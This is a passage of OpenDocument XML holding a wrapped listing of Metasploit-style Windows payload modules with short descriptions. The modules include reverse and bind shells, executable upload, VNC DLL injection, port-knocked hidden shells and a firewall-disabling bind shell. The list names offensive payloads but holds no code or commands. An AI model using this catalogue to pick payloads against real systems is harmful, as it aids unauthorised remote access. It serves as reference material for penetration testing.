      <text:p text:style-name="P1"><text:s text:c="37"/>indows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/pingback_reverse_tcp <text:s text:c="4"/>Connect back to attacker and re</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port UUID (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/powershell_bind_tcp <text:s text:c="5"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn an interactive powershell se</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ssion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/powershell_reverse_tcp <text:s text:c="2"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn an interactive powershell se</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ssion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/powershell_reverse_tcp_ <text:s/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ssl <text:s text:c="29"/>wn an interactive powershell se</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ssion over SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_hidden_ipkno <text:s/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ck_tcp <text:s text:c="26"/>aged). Listen for a connection.</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>First, the port will need to b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e knocked from the IP defined i</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n KHOST. This IP will work as a</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>n authentication method (you ca</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n spoof it with tools like hpin</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>g). After that you could get yo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ur shellcode from any IP. The s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ocket will appear as "closed,"</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>thus helping to hide the shellc</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_hidden_tcp <text:s text:c="3"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>from a hidden port and spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>command shell to the allowed ho</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>st.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_ipv6_tcp <text:s text:c="5"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Listen for an IPv6 conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_ipv6_tcp_uui <text:s/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d <text:s text:c="31"/>aged). Listen for an IPv6 conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction with UUID Support (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_named_pipe <text:s text:c="3"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Listen for a pipe connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_nonx_tcp <text:s text:c="5"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_tcp <text:s text:c="10"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_tcp_rc4 <text:s text:c="6"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/bind_tcp_uuid <text:s text:c="5"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with UUID Support (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/find_tag <text:s text:c="10"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Use an established conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_ipv6_tcp <text:s text:c="2"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_nonx_tcp <text:s text:c="2"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_ord_tcp <text:s text:c="3"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_tcp <text:s text:c="7"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_tcp_allpo <text:s/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rts <text:s text:c="29"/>aged). Try to connect back to t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he attacker, on all possible po</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rts (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>windows/shell/reverse_tcp_dns <text:s text:c="3"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_tcp_rc4 <text:s text:c="3"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_tcp_rc4_d <text:s/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ns <text:s text:c="30"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_tcp_uuid <text:s text:c="2"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell/reverse_udp <text:s text:c="7"/>Spawn a piped command shell (st</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>aged). Connect back to the atta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell_bind_tcp <text:s text:c="10"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell_bind_tcp_xpfw <text:s text:c="5"/>Disable the Windows ICF, then l</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>isten for a connection and spaw</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell_hidden_bind_tcp <text:s text:c="3"/>Listen for a connection from ce</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rtain IP and spawn a command sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ell. The shellcode will reply w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ith a RST packet if the connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ions is not coming from the IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>defined in AHOST. This way the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port will appear as "closed" he</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>lping us to hide the shellcode.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/speak_pwned <text:s text:c="13"/>Causes the target to say "You G</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ot Pwned" via the Windows Speec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h API</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_hidden_ipkn <text:s/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ock_tcp <text:s text:c="25"/>it (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction. First, the port will nee</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d to be knocked from the IP def</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ined in KHOST. This IP will wor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k as an authentication method (</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>you can spoof it with tools lik</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e hping). After that you could</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>get your shellcode from any IP.</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>The socket will appear as "clo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sed," thus helping to hide the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_hidden_tcp <text:s text:c="2"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction from a hidden port and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell to the allo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_ipv6_tcp <text:s text:c="4"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_ipv6_tcp_uu <text:s/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>id <text:s text:c="30"/>it (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection with UUID Support (</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_named_pipe <text:s text:c="2"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Listen for a pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_nonx_tcp <text:s text:c="4"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_tcp <text:s text:c="9"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_tcp_rc4 <text:s text:c="5"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/bind_tcp_uuid <text:s text:c="4"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction with UUID Support (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/find_tag <text:s text:c="9"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Use an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_ipv6_tcp <text:s/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_nonx_tcp <text:s/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_ord_tcp <text:s text:c="2"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_tcp <text:s text:c="6"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_tcp_allp <text:s/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>orts <text:s text:c="28"/>it (staged). Try to connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker, on all possi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ble ports (1-65535, slowly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_tcp_dns <text:s text:c="2"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_tcp_rc4 <text:s text:c="2"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_tcp_rc4_ <text:s/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>dns <text:s text:c="29"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/upexec/reverse_tcp_uuid <text:s/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>windows/upexec/reverse_udp <text:s text:c="6"/>Uploads an executable and runs</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>it (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_hidden_i <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pknock_tcp <text:s text:c="22"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a connection. First, the port w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ill need to be knocked from the</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>IP defined in KHOST. This IP w</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ill work as an authentication m</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ethod (you can spoof it with to</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ols like hping). After that you</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>could get your shellcode from</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>any IP. The socket will appear</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>as "closed," thus helping to hi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>de the shellcode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_hidden_t <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a connection from a hidden port</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>and spawn a command shell to t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>he allowed host.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_ipv6_tcp <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an IPv6 connection (Windows x86</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_ipv6_tcp <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_uuid <text:s text:c="27"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an IPv6 connection with UUID Su</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>pport (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_named_pi <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pe <text:s text:c="30"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a pipe connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_nonx_tcp <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a connection (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_tcp <text:s text:c="6"/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a connection (Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_tcp_rc4 <text:s text:c="2"/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/bind_tcp_uuid <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Listen for</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a connection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>(Windows x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/find_tag <text:s text:c="6"/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Use an esta</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>blished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_hop_h <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ttp <text:s text:c="29"/>ve loader (staged). Tunnel comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>unication over an HTTP or HTTPS</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>hop point. Note that you must</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>first upload data/hop/hop.php t</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>o the PHP server you wish to us</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e as a hop.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_http <text:s text:c="2"/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Tunnel comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>unication over HTTP (Windows wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ninet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_http_ <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>proxy_pstore <text:s text:c="20"/>ve loader (staged). Tunnel comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>unication over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_ipv6_ <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_nonx_ <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker (No NX)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_ord_t <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_tcp <text:s text:c="3"/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_tcp_a <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>llports <text:s text:c="25"/>ve loader (staged). Try to conn</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ect back to the attacker, on al</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>l possible ports (1-65535, slow</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ly)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_tcp_d <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ns <text:s text:c="30"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_tcp_r <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>c4 <text:s text:c="30"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_tcp_r <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>c4_dns <text:s text:c="26"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_tcp_u <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>uid <text:s text:c="29"/>ve loader (staged). Connect bac</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>k to the attacker with UUID Sup</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/vncinject/reverse_winht <text:s/>Inject a VNC Dll via a reflecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tp <text:s text:c="30"/>ve loader (staged). Tunnel comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>unication over HTTP (Windows wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/bind_ipv6_tc <text:s/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>for an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/bind_ipv6_tc <text:s/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p_uuid <text:s text:c="26"/>for an IPv6 connection with UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/bind_named_p <text:s/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ipe <text:s text:c="29"/>for a pipe connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>windows/x64/custom/bind_tcp <text:s text:c="5"/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/bind_tcp_rc4 <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/bind_tcp_uui <text:s/>Custom shellcode stage. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d <text:s text:c="31"/>for a connection with UUID Supp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_http <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_http <text:s/>Custom shellcode stage. Tunnel</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>s <text:s text:c="31"/>communication over HTTP (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>windows/x64/custom/reverse_name <text:s/>Custom shellcode stage. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_pipe <text:s text:c="27"/>back to the attacker via a nam</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ed pipe pivot</text:p>
